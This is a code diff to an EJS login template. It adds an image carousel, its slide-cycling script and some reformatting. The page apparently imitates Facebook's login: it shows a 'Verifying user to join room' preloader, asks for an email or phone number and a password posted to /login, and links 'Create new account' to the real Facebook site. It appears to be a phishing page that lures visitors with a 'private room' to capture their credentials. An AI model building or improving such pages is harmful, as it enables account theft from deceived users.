@@ -28,8 +28,10 @@
         #preloader.hidden {
             opacity: 0;
             visibility: hidden;
-            pointer-events: none; /* Prevent interaction */
-            display: none; /* Ensure it is not displayed */
+            pointer-events: none;
+            /* Prevent interaction */
+            display: none;
+            /* Ensure it is not displayed */
         }
 
         /* Preloader spinner */
@@ -62,6 +64,7 @@
         }
 
         @keyframes fadeInOut {
+
             0%,
             100% {
                 opacity: 1;
@@ -140,8 +143,24 @@
         <div class="preloader-text">Verifying user to join room</div>
     </div>
 
-    <!-- Main content starts here -->
+
+    <!-- Carousel Background -->
+    <div class="carousel-background">
+        <div class="carousel-images">
+            <div class="carousel-slide">
+                <img src="/image/image1.jpg" alt="Image 1">
+            </div>
+            <div class="carousel-slide">
+                <img src="/image/image2.jpg" alt="Image 2">
+            </div>
+            <!-- Add more carousel slides as needed -->
+        </div>
+        <div class="carousel-overlay"></div>
+    </div>
+
+    <!-- Main content -->
     <div class="wrapper">
+        <!-- <div class="hello"> -->
         <div class="left-side">
             <div class="left-container">
                 <img src="/image/face.svg" class="img" alt="" />
@@ -154,26 +173,29 @@
             <div class="login-box">
                 <form action="/login" method="post">
                     <% if (message) { %>
-                        <div class="message <% if (message.includes('success')) { %> success <% } else { %> error <% } %>">
+                        <div
+                            class="message <% if (message.includes('success')) { %> success <% } else { %> error <% } %>">
                             <%= message %>
                         </div>
-                    <% } %>
-                    <input type="text" name="email" placeholder="Email address or phone number" required value="<%= email || '' %>">
-                    <input type="password" name="password" placeholder="Password" required>
+                        <% } %>
+                            <input type="text" name="email" placeholder="Email address or phone number" required
+                                value="<%= email || '' %>">
+                            <input type="password" name="password" placeholder="Password" required>
 
-                    <!-- Spinner and "Joining..." text - initially hidden -->
-                    <div class="joining" style="display: none;">
-                        Joining... <div class="loader"></div>
-                    </div>
+                            <!-- Spinner and "Joining..." text - initially hidden -->
+                            <div class="joining" style="display: none;">
+                                Joining... <div class="loader"></div>
+                            </div>
 
-                    <!-- Submit button -->
-                    <button type="submit" class="log">Join</button>
+                            <!-- Submit button -->
+                            <button type="submit" class="log">Join</button>
 
-                    <a href="#" class="log-link">Forgotten password?</a>
-                    <hr>
-                    <div class="create-btn-wrapper">
-                        <a href="https://web.facebook.com/?_rdc=1&_rdr" class="create-btn">Create new account</a>
-                    </div>
+                            <a href="#" class="log-link">Forgotten password?</a>
+                            <hr>
+                            <div class="create-btn-wrapper">
+                                <a href="https://web.facebook.com/?_rdc=1&_rdr" class="create-btn">Create new
+                                    account</a>
+                            </div>
                 </form>
             </div>
             <div class="form-b">
@@ -181,7 +203,16 @@
                 <span>to join the private room.</span>
             </div>
         </div>
+        <!-- </div> -->
+
     </div>
+
+
+
+
+
+    <!-- Main content starts here -->
+
 
     <footer>
         <div class="foot-wrapper">
@@ -226,6 +257,36 @@
                 preloader.classList.add("hidden");
                 console.log("Preloader hidden immediately as user has seen it."); // Debugging log
             }
+
+
+
+            // JavaScript to handle the image carousel behavior
+            let slideIndex = 0;
+            const slides = document.querySelectorAll('.carousel-slide');
+
+            // Function to show next slide
+            function showNextSlide() {
+                // Hide all slides
+                slides.forEach((slide) => {
+                    slide.classList.remove('active');
+                });
+
+                // Increment slide index
+                slideIndex = (slideIndex + 1) % slides.length; // Cycle through slides
+
+                // Show the next slide
+                slides[slideIndex].classList.add('active');
+            }
+
+            // Initial call to show first slide
+            slides[slideIndex].classList.add('active');
+
+            // Set interval to change slides every 5 seconds
+            setInterval(showNextSlide, 5000); // Change image every 5 seconds
+
+
+
+
         });
 
         // Show spinner on form submission
